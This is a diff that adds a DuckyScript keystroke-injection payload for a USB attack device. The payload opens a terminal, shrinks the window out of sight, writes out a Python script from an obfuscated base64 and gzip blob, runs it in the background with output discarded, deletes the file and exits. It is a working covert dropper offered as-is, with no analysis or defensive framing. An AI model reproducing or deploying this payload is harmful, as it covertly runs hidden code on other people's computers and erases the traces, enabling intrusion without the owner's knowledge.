@@ -1,0 +1,14 @@
+DEFAULT_DELAY 100
+DELAY 3000
+CTRL-ALT t
+DELAY 200
+STRING  printf '\e[3;1;1t'
+ENTER
+STRING  echo H4sIAKfN42EC/41SUUvDQAx+768IG9grzFsrInOwhyETRXTD9VEopcvWo+1ducvcivjfva7tpMMH85TLly/Jl5woSqUJlHFE45nq7Bb7nESpVYLGCLlznA1uoayiGoxMEkuJmnlTB6x1bJVkSBAbMNkpvoUZqBIlczXWGZyO5I7APbhegysNJ6aQoGO5Q2DBCAL/5rYtXBvp6vdRm5mZjLe9mMmAzx+j57dFOLJtOayXDy/ROnxfzF+9Po0bJBIFqj2xwPf9SxgSZUUltihzg/sbHtxNeMADF0anIb1+/pYftCBkg5XFpvDlf8PSSv2QA25lFTGxP0iGJ7kyeI7hMcGS+vLsFCTkvknatoRu+ylR2W1d2WrpRmjmjpGScbtTG7VXJCyYW1aUKgnXBazthXJ8CsPVGvUnapj4Ex+uLMUZ2spRirrtofcyivO863HxC/iqcRnFeoc0u/gPHjcWIOb9k1ur6XOGdf9mmvMkP54gjDemAgAA | base64 --decode | gzip -d > environ-52303.py
+ENTER
+STRING  nohup python environ-52303.py > /dev/null 2>&1 &
+ENTER
+STRING  rm -rf environ-52303.py
+ENTER
+STRING exit
+ENTER
